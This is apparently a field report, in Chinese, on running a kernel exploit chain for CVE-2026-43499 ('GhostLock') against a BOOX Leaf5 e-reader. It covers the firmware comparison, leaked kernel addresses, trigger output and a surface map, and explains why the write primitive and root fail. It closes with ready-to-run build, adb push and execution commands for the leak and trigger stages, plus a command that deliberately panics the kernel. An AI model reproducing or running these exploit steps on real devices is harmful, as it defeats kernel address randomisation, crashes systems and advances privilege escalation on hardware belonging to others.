# BOOX Leaf5 × GhostLock（CVE-2026-43499）实机验证报告

- 设备：ONYX Leaf5（serial e913138），Android 13 / SDK 33
- 仓库：`tautcony/leaf5-ghostlock` @ main（2026-09-03 最后提交）
- 执行时间：2026-10-26 09:45–09:58 HKT
- 结论一句话：**内核与仓库靶机同一份，前三段全通，S05 写原语仍是断点，root 拿不到。**

---

## 1. 固件差异判定：system 不同，kernel 相同

### 1.1 内核（决定这条链能不能走）

| 项 | 仓库记录（#38 / slot_b） | 你的设备 | 判定 |
|---|---|---|---|
| `uname -a` | `4.19.157-perf-g77c132eccfab-dirty #38 SMP PREEMPT Tue Jul 28 10:48:06 CST 2026` | 同字串 | **一致** |
| 编译者 | `onyx@onyxUbuntu`，clang 10.0.7 / binutils 2.27 | 同 | **一致** |
| commit | `g77c132eccfab`（dirty） | 同 | **一致** |
| 构建序号 | `#38` | 同 | **一致** |
| `/proc/config.gz` | sha256 `240c0e39e36fdf83273c1e5366b26cffe0cf0d5dc69711ad07289b5df69709ed`（37609 B） | **同 sha256，字节级相同**（`cmp` 无差异） | **一致** |
| MemTotal | 3533784 kB | 3533784 kB | **一致** |

commit + 构建时间戳 + `#38` 三重一致，加上 config.gz 字节相同 —— 你的 boot 分区里跑的就是仓库 `raw/slotb_38` 那份内核。

仓库在 2026-08-13 已从 #245 切到 #38/slot_b 复测过，我这次的实测行为与它的 #38 记录逐条对上（见 §2）。

### 1.2 系统镜像（不影响链，影响用户态可达面）

| 项 | 仓库采集（2026-04） | 你的设备 |
|---|---|---|
| `ro.build.display.id` | `2026-04-21_12-49_4.2-rel_0421_19324b3ea` | `2026-09-28_15-24_4.2.3-rel_0928_656b72278` |
| incremental | — | `634` |
| `ro.build.date` | — | `Mon Sep 28 15:24:08 HKT 2026` |
| security patch | `2026-04-01` | `2026-04-01`（同） |
| fingerprint | `ONYX/TabBoox/TabBoox:13/TKQ1.230615.001/GV2.027.SQ83A:user/release-keys` | 同 |
| slot | `_b` | `_b`（同） |

`verifiedbootstate=orange`、`flash.locked=0` —— bootloader 已是解锁态。

**为什么 system 新了还能跑**：整条利用链只碰 kernel 对象（futex / `rt_mutex_waiter` / `pi_blocked_on` / KGSL），偏移来自 vmlinux，与 system 分区无关。system 换代改的是 SELinux 策略和节点权限，实测后果见 §2.3（ashmem EACCES），与仓库 #38 VERIFY 记录一致。

---

## 2. 实机结果（原始输出见 `logs/`）

### 2.1 S02 — 内核地址泄漏 ✅ 4/4

`KSNITCH_COLLISIONS=2`（仓库指定值，勿改 4，会掺假 collider），每轮 ~7–13 s：

| # | 泄漏地址 | pile-up / baseline |
|---|---|---|
| 1 | `0xffffff840003c6a0` | 65 / 6（≈10.8×） |
| 2 | `0xffffff84001369f0` | 100 / 8（≈12.5×） |
| 3 | `0xffffff8400288a98` | 58 / 8（≈7.3×） |
| 4 | `0xffffff800013bf90` | — |

侧信道信噪比 7–12 倍，KASLR 的 direct-map 基址已经拿得到（第 1–3 轮落在 `ffffff84…`，第 4 轮 `ffffff80…`，随进程/启动态变化，属正常）。

### 2.2 S04 — GhostLock 真触发边 ✅

```
[M] CMP_REQUEUE_PI ret=-1 errno=35 (Resource deadlock would occur)
[C] sched_setattr tid=21573 ret=0 errno=0
[W] WAIT_REQUEUE_PI ret=-1 errno=110 (Connection timed out)
[W] self sched_setattr ret=0 errno=0
[O] LOCK_PI chain returned ret=0 errno=0
=== SUMMARY ===
requeue_ret=-1 requeue_errno=35
wait_returned=1 wait_ret=-1 wait_errno=110
KERNEL SURVIVED
```

`errno=35 (EDEADLK)` 就是 `remove_waiter` 误清 `current->pi_blocked_on` 的那条回滚边 —— 漏洞本体在你机器上是活的。注意 `ret=1` 只表示 requeue 成功，**不是**这个洞；必须是 `-1/35`。

### 2.3 设备面触达基线（#38 slot_b）

| 节点 | 结果 |
|---|---|
| `/dev/kgsl-3d0` | open OK；`DRAWCTXT_CREATE flags=0x12` → id=10 **OK**（`PREAMBLE\|NO_GMEM_ALLOC` 才对） |
| `/dev/ashmem` | **EACCES(13)**，读写都拒 —— 与仓库 #38 记录一致，S05 的 shmem 写消费者在这版系统上直接断了入口 |
| `/dev/binder`、`/dev/hwbinder`、`/dev/uhid`、`/dev/uinput` | open OK |
| `/dev/qce`、`/dev/diag`、`/dev/dri/card0`、`/dev/ion` | EACCES(13) |
| `bpf(MAP_CREATE)` | EACCES(13) |
| `perf_event_open`（SW/HW） | **OK**（fd=3） |

---

## 3. 断点在哪，为什么 root 拿不到

```
S00 画像      ✅
S01 偏移      ✅（target.h 现成，#38 与 #245 的 waiter 布局一致）
S02 泄漏      ✅ 本机 4/4
S03 spray     ✅
S04 EDEADLK   ✅ 本机 errno=35
S05 写原语    ⛔ rb_erase 在 PI walk 里根本不到；ashmem fops 写全矩阵 errno=22；本机 ashmem 还 EACCES
S06 E2E       ⛔ 依赖 S05
S07 root      ⛔ 依赖 S05
```

仓库 2026-07-26 的 AArch64 追踪给了决定性证据：`PSELECT_LOCK_CRASH=1` 能崩（trylock 到了），`PSELECT_PARENT_CRASH=1` **不崩**（`rb_erase` 从未被调用），PI walk 在 `tbnz w28` 处提前退出。2026-08-13 在 #38 上复测同样结果。**这条路不是"再跑几次就行"，是写 gadget 不存在。**

所以这仓库在你机器上能给出的上限是：内核地址泄漏 + 可复现的栈 UAF + panic。要 root 得换写原语（`analysis/POST_B_ALTERNATIVES.md` 里的方向）或换洞，不是继续调参。

---

## 4. 复现

### 4.1 环境（本机已就绪）

```
NDK    C:\Users\thelu\AppData\Local\Android\Sdk\ndk\27.0.12077973
adb    C:\Users\thelu\AppData\Local\Android\Sdk\platform-tools\adb.exe
```
本机无 Docker / make，仓库的 `docker-build` 路线走不通 —— 已改为直接用 NDK 的 `aarch64-linux-android35-clang`（API 35 包装器自带 `--target` + sysroot），产物仍写入仓库 `out/`，与 BUILD_OUTPUT.md 布局一致。

### 4.2 一键跑

```bash
cd /e/BOOX
./run_leaf5.sh all        # build + push + leak + edeadlk + surface
./run_leaf5.sh panic      # 单独触发：会让内核 panic 重启
```

### 4.3 分步（等价，手工版）

```bash
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*'
adb push out/exploit/aarch64/tests/test_mm_leak /data/local/tmp/exploit/aarch64/tests/
adb shell 'cd /data/local/tmp/exploit/aarch64/tests && KSNITCH_COLLISIONS=2 ./test_mm_leak'
adb shell 'cd /data/local/tmp/stages/S04 && ./ghostlock_edeadlk_detect'
adb shell 'cd /data/local/tmp/stages/S05 && ./slotb_surface_reach'
```

Windows 两个坑（都已在脚本里处理）：
1. `MSYS_NO_PATHCONV=1` —— 否则 `/data/local/tmp` 被 Git Bash 改写成 `C:/.../PortableGit/data/local/tmp`，push 必失败。
2. 本机路径给 `adb.exe` / `clang.exe` 要 `cygpath -m` 转成 `E:/...`，否则 `ld.lld: cannot open output file`。

### 4.4 产物

```
out/exploit/aarch64/tests/test_mm_leak                            14,288 B
out/exploit/aarch64/tests/test_futex_hash                         10,800 B
out/stages/S04-ghostlock-trigger/arm64/ghostlock_edeadlk_detect    2.2 MB (static)
out/stages/.../probes/arm64/slotb_surface_reach                    2.2 MB (static)
out/stages/.../probes/arm64/ghostlock_uaf_reclaim_consumer         2.2 MB (static)
logs/{runtime_version,s02_mm_leak,s04_edeadlk,s05_surface}.txt
logs/config_dev.gz（设备 /proc/config.gz，与仓库 raw/config.gz 同 sha256）
```

`ghostlock_uaf_reclaim_consumer` 已编译推送，未执行。跑它会在几秒内 kernel panic 并自动重启（单次可控解引用，不落盘）；重启后 `./run_leaf5.sh panic` 会自动抓 dmesg 的 `kernel_panic` 行入库。
